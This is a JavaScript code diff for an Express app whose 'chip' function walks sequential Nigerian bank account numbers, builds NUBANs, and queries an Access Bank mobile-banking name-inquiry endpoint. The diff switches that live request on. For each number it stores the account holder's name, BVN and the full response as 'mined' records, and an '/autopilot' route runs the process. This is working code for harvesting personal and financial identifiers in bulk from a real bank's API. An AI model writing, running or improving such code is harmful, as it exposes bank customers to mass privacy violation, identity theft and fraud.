@@ -187,50 +187,53 @@ ping = async (t,hippoLeg) => {
 const chip = async (x) => {
     var {timeStart,timeFrame,serial_no,startAccount,i,direction,bankCode,hippoLeg} = x;
     ping(timeFrame,hippoLeg);
-    while(Number(Math.round((new Date().getTime()/1000) - timeStart)) <= timeFrame){
-        i++;
-        direction == "up" ? (
-            serial_no = Number(startAccount) + i 
-        ): serial_no = startAccount - i;
-        var serial_no_length = serial_no.toString().length;
-        if (serial_no_length < 9) {
-            var zeroAmount = 9 - serial_no_length;
-            for (var o = 0; o < zeroAmount; o++) {
-                serial_no = "0" + serial_no;
-            }
-        }
-        var gen = await generate_nuban(serial_no, bankCode);
-        console.log(gen)
-        
-        var hippoExist = await hippo.findOne({
-            accountNumber: gen
-        });
-        console.log(hippoExist)
-        if (hippoExist == null) {
-            console.log("fetching");
-            /*var resp = await axios.get(`https://abp-mobilebank.accessbankplc.com/VBPAccess/webresources/nipNameInquiry2?destinationBankCode=${bankCode}&accountNumber=${gen}`);
-            console.log(`${resp.data.customerAccountName}`);
-            var data = resp.data;
-            if (data.customerAccountName != null) {
-                console.log("fetched");
-                var pdata = {
-                    bvn: data.beneficiaryBvn,
-                    accountNumber: gen,
-                    name: data.customerAccountName,
-                    bankCode: bankCode,
-                    dateMined: new Date(),
-                    dump: data
-                };
-                var person = new hippo(pdata);
-                try {
-                     setMineAmount();
-                    console.log("saving");
-                    person.save();
-                } catch (e) {
-                    res.json("error saving")
+    for(;;){
+        if(Number(Math.round((new Date().getTime()/1000) - timeStart)) <= timeFrame){
+            i++;
+            direction == "up" ? (
+                serial_no = Number(startAccount) + i 
+            ): serial_no = startAccount - i;
+            var serial_no_length = serial_no.toString().length;
+            if (serial_no_length < 9) {
+                var zeroAmount = 9 - serial_no_length;
+                for (var o = 0; o < zeroAmount; o++) {
+                    serial_no = "0" + serial_no;
                 }
-            }*/
-        } else console.log(`${gen} exists`);
+            }
+            var gen = await generate_nuban(serial_no, bankCode);
+            console.log(gen)
+            
+            var hippoExist = await hippo.findOne({
+                accountNumber: gen
+            });
+            console.log(hippoExist)
+            if (hippoExist == null) {
+                console.log("fetching");
+                var resp = await axios.get(`https://abp-mobilebank.accessbankplc.com/VBPAccess/webresources/nipNameInquiry2?destinationBankCode=${bankCode}&accountNumber=${gen}`);
+                console.log(`${resp.data.customerAccountName}`);
+                var data = resp.data;
+                if (data.customerAccountName != null) {
+                    console.log("fetched");
+                    var pdata = {
+                        bvn: data.beneficiaryBvn,
+                        accountNumber: gen,
+                        name: data.customerAccountName,
+                        bankCode: bankCode,
+                        dateMined: new Date(),
+                        dump: data
+                    };
+                    var person = new hippo(pdata);
+                    try {
+                        setMineAmount();
+                        console.log("saving");
+                        person.save();
+                    } catch (e) {
+                        res.json("error saving")
+                    }
+                }
+            } else console.log(`${gen} exists`);
+        }
+        else return;
     }
 }
 app.get("/autopilot/:timeFrame/:bankCode/:direction/:hippoLeg",async (req,res)=>{
